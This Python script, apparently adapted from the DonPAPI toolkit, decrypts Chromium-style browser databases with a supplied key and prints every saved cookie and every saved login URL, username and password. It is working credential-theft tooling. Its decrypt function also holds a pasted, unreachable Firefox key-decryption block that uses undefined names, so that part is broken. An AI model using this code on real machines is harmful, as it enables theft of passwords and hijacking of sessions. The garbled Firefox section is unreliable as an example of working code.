#code inspired by DonPAPI https://github.com/login-securite/DonPAPI

import sys
import base64
import sqlite3
import os
from Crypto.Cipher import AES
import binascii
import json
from datetime import datetime,timedelta
from pyasn1.codec.der import decoder


def cookies(key, file_location):
	# connect to database
	if os.path.isfile(file_location) == False:
		print("Error: File does not exist")
		sys.exit(1)
	try:
		conn = sqlite3.connect(file_location)
		cursor = conn.cursor()
		# get encrypted cookies from cookies table
		cursor.execute('select host_key, "TRUE", path, "FALSE", expires_utc, name, encrypted_value from cookies')
		values = cursor.fetchall()
		for host_key, _, path, _, expires_utc, name, encrypted_value in values:
			# print results
			# print("Cookie: " + host_key +":"+ name + decrypt_data(encrypted_value, key) + ";")
			print("Host: " + host_key)
			print("Path: " + path)
			print("Name: " + name)
			print("Cookie: " + decrypt_data(encrypted_value, key) + ";")
			print("Expires: " + (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S'))
			print("")
	except sqlite3.Error as e:
		print("Error: Could not connect to database")
		print(e)
		sys.exit(1)

def login_data(key, file_location):
	# connect to database
	if os.path.isfile(file_location) == False:
		print("Error: File does not exist")
		sys.exit(1)
	try:
		conn = sqlite3.connect(file_location)
		cursor = conn.cursor()
		# get encrypted passwords from logins table
		cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
		values = cursor.fetchall()
		for origin_url, username_value, password_value in values:
			# print results
			print("URL: " + origin_url)
			print("Username: " + username_value)
			print("Password: " + decrypt_data(password_value, key))
			print("")
	except sqlite3.Error as e:
		print("Error: Could not connect to database")
		print(e)
		sys.exit(1)

def decrypt_data(encrypted_junk, key):
	#print(key)
	key = binascii.unhexlify(key)
	try:
		nonce = encrypted_junk[3:3 + 12]
		cipher_text = encrypted_junk[15:]
		tag = encrypted_junk[-16:]
		plain_text = AES.new(key, AES.MODE_GCM, nonce)
		text = plain_text.decrypt(cipher_text)[:-16]
		return text.decode('utf-8')
	except Exception as e:
		print("Error: Could not decrypt password")
		print(e)
		sys.exit(1)


		"""
		User master key is also encrypted (if provided, the master_password could be used to encrypt it)
		"""
		# See http://www.drh-consultancy.demon.co.uk/key3.html
		pbeAlgo = str(decoded_item[0][0][0])
		if pbeAlgo == '1.2.840.113549.1.12.5.1.3':  # pbeWithSha1AndTripleDES-CBC
			entry_salt = decoded_item[0][0][1][0].asOctets()
			cipher_t = decoded_item[0][1].asOctets()

			# See http://www.drh-consultancy.demon.co.uk/key3.html
			hp = sha1(global_salt + master_password).digest()
			pes = entry_salt + convert_to_byte('\x00') * (20 - len(entry_salt))
			chp = sha1(hp + entry_salt).digest()
			k1 = hmac.new(chp, pes + entry_salt, sha1).digest()
			tk = hmac.new(chp, pes, sha1).digest()
			k2 = hmac.new(chp, tk + entry_salt, sha1).digest()
			k = k1 + k2
			iv = k[-8:]
			key = k[:24]
			return triple_des(key, CBC, iv).decrypt(cipher_t)

		# New version
		elif pbeAlgo == '1.2.840.113549.1.5.13':  # pkcs5 pbes2

			assert str(decoded_item[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
			assert str(decoded_item[0][0][1][0][1][3][0]) == '1.2.840.113549.2.9'
			assert str(decoded_item[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
			# https://tools.ietf.org/html/rfc8018#page-23
			entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
			iteration_count = int(decoded_item[0][0][1][0][1][1])
			key_length = int(decoded_item[0][0][1][0][1][2])
			assert key_length == 32

			k = sha1(global_salt + master_password).digest()
			key = pbkdf2_hmac('sha256', k, entry_salt, iteration_count, dklen=key_length)

			# https://hg.mozilla.org/projects/nss/rev/fc636973ad06392d11597620b602779b4af312f6#l6.49
			iv = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
			# 04 is OCTETSTRING, 0x0e is length == 14
			encrypted_value = decoded_item[0][1].asOctets()
			aes = AESModeOfOperationCBC(key, iv=iv)
			cleartxt = b"".join([aes.decrypt(encrypted_value[i:i + AES_BLOCK_SIZE])
			                     for i in range(0, len(encrypted_value), AES_BLOCK_SIZE)])

			return cleartxt
def main():
	# get arguements
	args = sys.argv[1:]
	if len(args) != 3:
		print("Usage: python decrypt.py <base64 key> [--cookies || --passwords <DB File Location>]")
		sys.exit(1)
	base64_key = args[0]
	option = args[1]
	file_location = args[2]
	
	#base64 decode key
	if option == "--cookies":
		key = bytearray(base64.b64decode(base64_key).decode('utf-8').replace('\\x', ''), 'utf-8')
		cookies(key, file_location)
	elif option == "--passwords":
		key = bytearray(base64.b64decode(base64_key).decode('utf-8').replace('\\x', ''), 'utf-8')
		login_data(key, file_location)
	elif option == "--firefox":
		print("TO DO")
	else:
		print("Usage: python decrypt.py <base64 key> [--cookies || --passwords <DB File Location>]")
		sys.exit(1)
	


if __name__ == "__main__":
	main()